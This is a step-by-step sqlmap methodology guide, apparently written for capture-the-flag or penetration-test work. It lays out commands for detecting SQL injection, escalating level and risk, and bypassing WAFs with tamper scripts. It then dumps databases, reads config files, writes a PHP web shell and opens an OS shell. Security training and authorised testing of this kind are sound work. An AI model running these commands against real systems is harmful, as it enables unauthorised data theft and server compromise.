# SQLMap Methodology

**Core principle:** Read the case/target first. Understand the injection context before crafting the command. Use only what you need — escalate when simple fails.

---

## Step 1 — Baseline Command

Start with the simplest possible command and confirm SQLi before adding flags:

```bash
# GET parameter
sqlmap -u "http://TARGET/page.php?id=1" --batch

# POST data
sqlmap -u "http://TARGET/login.php" --data="username=admin&password=test" --batch

# From Burp request file
sqlmap -r login_request.txt --batch
```

`--batch` answers all prompts automatically. Use it every time.

---

## Step 2 — Identify the Injection Point

| Context | Flag to use |
|---------|------------|
| GET parameter | `-u "URL?param=value"` — sqlmap tests all params |
| POST body | `--data="param=value"` |
| Cookie | `--cookie="PHPSESSID=abc"` |
| Custom header | `-H "X-Forwarded-For: *"` |
| Burp request file | `-r request.txt` |
| Non-obvious injection location | Add `*` marker: `--data="id=1*&other=val"` |

**If the parameter isn't obvious, use a `*` marker in the value to tell sqlmap exactly where to inject.**

---

## Step 3 — Handle Special Cases Before Running

Read the target page source before crafting the command. Common special cases:

### Anti-CSRF Token
```bash
--csrf-token="tokenFieldName"
```
Sqlmap will automatically fetch a fresh token before each request.

**Handle tokens carefully in the terminal — multi-line commands break token values. Use a variable:**
```bash
TOKEN=$(curl -s http://TARGET/page | grep -oP 'token" value="\K[^"]+')
sqlmap -u "..." --data="...&token=$TOKEN" --csrf-token="token" --batch
```

### Unique/Dynamic Parameter (generated server-side)
```bash
--randomize=paramName
```
First fetch the page to confirm the parameter format, then use `--randomize` so sqlmap randomizes per request. **Do not hardcode a uid/token that was dynamically generated** — fetch it first to understand the format.

### Calculated/Derived Parameter
```bash
--eval="import hashlib; h=hashlib.md5(id.encode()).hexdigest()"
```

---

## Step 4 — Escalate Systematically

Start low, escalate only when simple fails:

```
Level 1, Risk 1 (default) → Level 2-3 → Level 5, Risk 3
```

```bash
# Default (fast, low noise)
sqlmap -u "..." --batch

# Escalate detection
sqlmap -u "..." --level=5 --risk=3 --batch

# Specify technique to force
sqlmap -u "..." --technique=BEU --batch

# Fix wrong column count for UNION
sqlmap -u "..." --union-cols=3-6 --batch

# Fix UNION data retrieval issues
sqlmap -u "..." --no-cast --batch
```

---

## Step 5 — WAF/Filter Bypass

```bash
# Try tamper scripts when direct injection is blocked
sqlmap -u "..." --tamper=between --batch
sqlmap -u "..." --tamper=randomcase --batch
sqlmap -u "..." --tamper=space2comment --batch

# Combine tampers
sqlmap -u "..." --tamper=between,randomcase --batch

# Use random agent to avoid UA fingerprinting
sqlmap -u "..." --random-agent --batch
```

---

## Step 6 — Enumeration

Only enumerate what you need. Don't dump everything.

```bash
# List databases
sqlmap -u "..." --dbs --batch

# List tables in a DB
sqlmap -u "..." -D dbname --tables --batch

# List columns in a table
sqlmap -u "..." -D dbname -T tablename --columns --batch

# Dump specific column
sqlmap -u "..." -D dbname -T tablename -C colname --dump --batch

# Dump all (use sparingly)
sqlmap -u "..." --dump --batch
```

---

## Step 7 — Privilege Check and OS Exploitation

```bash
# Check if DBA
sqlmap -u "..." --is-dba --batch

# Read a file
sqlmap -u "..." --file-read="/var/www/html/config.php" --batch

# Write a file
sqlmap -u "..." --file-write="./shell.php" --file-dest="/var/www/html/shell.php" --batch

# Get interactive OS shell (Error-based technique works best)
sqlmap -u "..." --os-shell --technique=E --batch
```

**Inside os-shell:**
```bash
find / -name "flag*" 2>/dev/null
cat /path/to/flag.txt
```

---

## Decision Flow

```
1. Read target page source → understand params, hidden fields, tokens
2. Build baseline command → --batch
3. Injection found? → enumerate (--dbs → --tables → --columns → --dump)
4. Injection NOT found?
   └─ Add * marker to force injection point
   └─ Escalate --level / --risk
   └─ Add --prefix / --suffix if query structure is known
   └─ Add --tamper for WAF bypass
5. UNION failing? → --no-cast or --union-cols
6. Is DBA? → --file-read → --file-write → --os-shell
```

---

## Common Mistakes to Avoid

| Mistake | Fix |
|---------|-----|
| Hardcoding a dynamically-generated uid/token | Fetch the page first, use `--randomize` |
| `--csrf-token` value split by terminal newline | Store token in `$TOKEN` variable, pass on one line |
| UNION extraction returning garbage | Add `--no-cast` |
| SSL/HTTPS errors | Drop all SSL flags — sqlmap handles HTTPS automatically |
| Injection not found at default level | Escalate to `--level=5 --risk=3` |
| Unknown query structure | Use `--prefix` and `--suffix` to wrap injection |
| Case-sensitive WAF | Use `--tamper=randomcase` |
